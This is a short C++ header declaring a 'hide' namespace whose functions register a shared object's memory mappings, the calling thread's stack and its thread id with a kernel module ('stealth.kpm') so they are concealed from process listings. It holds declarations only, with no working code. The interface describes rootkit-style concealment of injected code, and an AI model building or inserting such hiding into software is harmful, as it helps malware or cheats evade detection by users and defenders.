#pragma once

namespace nr3e::hide
{
	/** Kernel hide-maps: register this SO's VMAs + keywords. Safe to call repeatedly. */
	void Apply(bool WipeHeap = false);
	/** Hide the calling thread's stack VMA (Boot thread). */
	void CoverCurrentStack();
	/** Register calling tid with hide-maps filldir (stealth.kpm). */
	void HideCurrentTid();
}
